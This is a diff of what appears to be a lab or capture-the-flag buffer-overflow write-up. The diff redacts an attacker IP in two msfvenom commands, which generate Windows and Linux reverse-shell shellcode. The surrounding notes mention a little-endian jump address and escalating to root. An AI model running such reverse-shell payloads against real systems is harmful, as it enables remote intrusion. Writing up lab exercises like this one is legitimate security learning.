@@ -131,7 +131,7 @@ except:
 - 311712F3 Jump Point
 - Convert to little endian ``\xf3\x12\x17\x31``
 - Generate shellcode with badchars... since this is a linux machine try linux shellcode? and try on target?
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f c``
 - update target IP and little endian and shellcode and lets see what happens
 
 ```python
@@ -189,7 +189,7 @@ except:
 **Escalate your privileges to root.**
 
 - generate new linux shellcode and send
-- ``msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.2.127.225 LPORT=9999 -f c -a x86 --platform linux -b "\x00"``
+- ``msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.x.x.x LPORT=9999 -f c -a x86 --platform linux -b "\x00"``
 - upgrade shell 
 
 ```shell
